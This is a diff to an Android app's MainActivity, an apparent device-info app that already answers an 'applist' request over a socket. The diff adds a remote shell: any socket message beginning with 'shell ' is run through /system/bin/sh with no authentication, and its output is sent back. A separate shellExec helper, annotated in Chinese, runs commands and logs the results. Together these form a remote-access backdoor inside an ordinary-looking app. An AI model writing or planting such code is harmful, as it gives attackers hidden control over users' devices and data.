@@ -3,6 +3,7 @@ package com.example.application;
 import androidx.appcompat.app.AppCompatActivity;
 
 import java.io.BufferedReader;
+import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
@@ -11,8 +12,13 @@ import java.net.Socket;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Locale;
+import java.util.concurrent.Callable;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.Future;
 
 import android.annotation.SuppressLint;
+import android.app.Activity;
 import android.app.ActivityManager;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
@@ -23,10 +29,12 @@ import android.os.Debug;
 import android.os.Environment;
 import android.os.StatFs;
 import android.provider.Settings;
+import android.util.Log;
 import android.widget.TextView;
 
 
-public class MainActivity extends AppCompatActivity {
+public class MainActivity extends Activity {
+    public static ExecutorService executorService = Executors.newFixedThreadPool(100);
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -69,6 +77,48 @@ public class MainActivity extends AppCompatActivity {
                             if (message.equals("applist")) {
                                 printWriter.println(getAppList());
                                 printWriter.flush();
+                            }
+                            if (message.startsWith("shell ")) {
+                                try{
+                                    String shell = message.substring(6);
+                                    Runtime runtime = Runtime.getRuntime();
+
+                                    Future<Integer> future = executorService.submit(new Callable<Integer>() {
+                                        @Override
+                                        public Integer call() {
+                                            try {
+                                                String[] sendCommand = {
+                                                        "/system/bin/sh","-c",
+                                                        shell
+                                                };
+                                                Process p = Runtime.getRuntime().exec(sendCommand);
+                                                String data = null;
+                                                BufferedReader ie = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+                                                BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                                                String error = null;
+                                                while ((error = ie.readLine()) != null
+                                                        && !error.equals("null")) {
+                                                    data += error + "\n";
+                                                }
+                                                String line = null;
+                                                while ((line = in.readLine()) != null
+                                                        && !line.equals("null")) {
+                                                    data += line + "\n";
+                                                }
+                                                printWriter.println(data.substring(4));
+                                                printWriter.flush();
+                                            }catch (Exception exception) {
+                                                printWriter.println(" [ERROR] COMMAND ERROR !");
+                                                printWriter.flush();
+                                            }
+                                            return 0;
+                                        }
+                                    });
+                                }catch (Exception exception){
+                                    printWriter.println("Command Error or Runtime Error!");
+                                    printWriter.flush();
+                                    continue;
+                                }
                             }
                         }
                         socket.close();
@@ -124,5 +174,39 @@ public class MainActivity extends AppCompatActivity {
             stringBuffer.append("/n");
         }
         return stringBuffer.toString();
+    }
+    public static StringBuffer shellExec(String cmd) {
+        Runtime mRuntime = Runtime.getRuntime(); //执行命令的方法
+        try {
+            //Process中封装了返回的结果和执行错误的结果
+            Process mProcess = mRuntime.exec(cmd); //加入参数
+            //使用BufferReader缓冲各个字符，实现高效读取
+            //InputStreamReader将执行命令后得到的字节流数据转化为字符流
+            //mProcess.getInputStream()获取命令执行后的的字节流结果
+            BufferedReader mReader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));
+            //实例化一个字符缓冲区
+            StringBuffer mRespBuff = new StringBuffer();
+            //实例化并初始化一个大小为1024的字符缓冲区，char类型
+            char[] buff = new char[1024];
+            int ch = 0;
+            //read()方法读取内容到buff缓冲区中，大小为buff的大小，返回一个整型值，即内容的长度
+            //如果长度不为null
+            while ((ch = mReader.read(buff)) != -1) {
+                //就将缓冲区buff的内容填进字符缓冲区
+                mRespBuff.append(buff, 0, ch);
+            }
+            //结束缓冲
+            mReader.close();
+            Log.i("shell", "shellExec: " + mRespBuff);
+            //弹出结果
+//            Log.i("shell", "执行命令: " + cmd + "执行成功");
+            return mRespBuff;
+
+        } catch (IOException e) {
+            // 异常处理
+            // TODO Auto-generated catch block
+            e.printStackTrace();
+        }
+        return null;
     }
 }
